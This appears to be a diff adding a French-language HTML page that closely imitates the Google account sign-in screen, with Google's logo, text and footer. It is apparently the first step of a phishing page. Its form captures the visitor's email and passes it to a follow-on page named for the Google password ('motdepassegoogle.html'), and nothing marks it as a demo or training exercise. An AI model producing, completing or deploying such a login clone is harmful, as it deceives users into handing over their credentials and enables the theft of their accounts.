@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion - Comptes Google</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: #121212; color: #ffffff; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .google-card { width: 100%; max-width: 450px; padding: 48px 40px 36px; display: flex; flex-direction: column; align-items: flex-start; }
+        .google-logo { width: 74px; height: 24px; margin-bottom: 16px; }
+        h1 { font-size: 24px; font-weight: 400; margin-bottom: 8px; }
+        p.google-subtitle { font-size: 16px; margin-bottom: 40px; }
+        form { width: 100%; }
+        .form-group { position: relative; margin-bottom: 8px; }
+        input[type="text"] { width: 100%; padding: 16px 14px; background-color: transparent; border: 1px solid rgba(255, 255, 255, 0.3); border-radius: 4px; font-size: 16px; color: #ffffff; transition: border-color 0.2s; }
+        input[type="text"]:focus { outline: none; border: 2px solid #8ab4f8; padding: 15px 13px; }
+        input[type="text"]::placeholder { color: rgba(255, 255, 255, 0.7); }
+        .forgot-link { display: inline-block; color: #8ab4f8; text-decoration: none; font-weight: 600; font-size: 14px; margin-top: 8px; margin-bottom: 48px; }
+        .disclaimer-text { color: rgba(255, 255, 255, 0.7); font-size: 14px; line-height: 1.5; margin-bottom: 32px; }
+        .disclaimer-text a { color: #8ab4f8; text-decoration: none; font-weight: 600; }
+        .action-container { display: flex; justify-content: space-between; align-items: center; margin-bottom: 32px; margin-top: 10px; }
+        .create-account-btn { background: none; border: none; color: #8ab4f8; font-weight: 600; font-size: 14px; cursor: pointer; text-decoration: none; }
+        .submit-btn { background-color: #8ab4f8; color: #121212; border: none; border-radius: 24px; padding: 10px 24px; font-size: 14px; font-weight: 600; cursor: pointer; transition: background-color 0.2s; }
+        .submit-btn:hover { background-color: #a0c3ff; }
+        footer { width: 100%; font-size: 12px; color: rgba(255, 255, 255, 0.7); display: flex; justify-content: space-between; align-items: center; }
+        .footer-left { display: flex; align-items: center; cursor: pointer; }
+        .footer-left svg { margin-left: 8px; width: 12px; height: 12px; fill: rgba(255, 255, 255, 0.7); }
+        .footer-right ul { display: flex; list-style: none; }
+        .footer-right ul li { margin-left: 16px; }
+        .footer-right ul li a { color: rgba(255, 255, 255, 0.7); text-decoration: none; }
+    </style>
+</head>
+<body>
+
+    <div class="google-card">
+        <svg class="google-logo" viewBox="0 0 160 52">
+            <path d="M117.8 21.3c0-1.2-.1-2.4-.3-3.6H100v6.8h10.1c-.4 2.2-1.6 4.1-3.4 5.4v4.5h5.5c3.2-3.1 5.6-7.8 5.6-13.1z" fill="#4285F4"/>
+            <path d="M100 39.4c5.1 0 9.4-1.7 12.5-4.6l-5.5-4.5c-.8.6-1.9 1-3.1 1-3.6 0-6.7-2.6-7.8-6.2H90v4.7c3.1 6.1 9.4 9.6 10 9.6z" fill="#34A853"/>
+            <path d="M92.2 25.1c-.3-1-.5-2-.5-3.1s.2-2.1.5-3.1V14.2H90c-1.3 2.6-2.1 5.5-2.1 8.8s.8 6.2 2.1 8.8z" fill="#FBBC05"/>
+            <path d="M100 13.6c2.8 0 5.2 1 7.2 2.9l5.3-5.3c-3.1-3.1-7.4-5.2-12.5-5.2-6.1 0-11.4 3.5-13.9 8.7V19.4H90c1.1-3.6 4.2-6.2 7.8-6.2z" fill="#EA4335"/>
+        </svg>
+
+        <h1>Connexion</h1>
+        <p class="google-subtitle">Utilisez votre compte Google</p>
+
+        <form onsubmit="event.preventDefault(); const email = document.getElementById('emailInput').value; window.location.href='motdepassegoogle.html?email=' + encodeURIComponent(email);">
+            <div class="form-group">
+                <input type="text" id="emailInput" placeholder="Adresse e-mail ou téléphone" required>
+            </div>
+            
+            <a href="#" class="forgot-link">Adresse e-mail oubliée ?</a>
+
+            <p class="disclaimer-text">
+                Ce n'est pas votre ordinateur ? Utilisez le mode Invité pour vous connecter en mode privé. <a href="#">En savoir plus sur l'utilisation du mode Invité</a>
+            </p>
+
+            <div class="action-container">
+                <a href="#" class="create-account-btn">Créer un compte</a>
+                <button type="submit" class="submit-btn">Suivant</button>
+            </div>
+        </form>
+
+        <footer>
+            <div class="footer-left">
+                <span>Français (France)</span>
+                <svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
+            </div>
+            <div class="footer-right">
+                <ul>
+                    <li><a href="#">Aide</a></li>
+                    <li><a href="#">Confidentialité</a></li>
+                    <li><a href="#">Conditions</a></li>
+                </ul>
+            </div>
+        </footer>
+    </div>
+
+</body>
+</html>
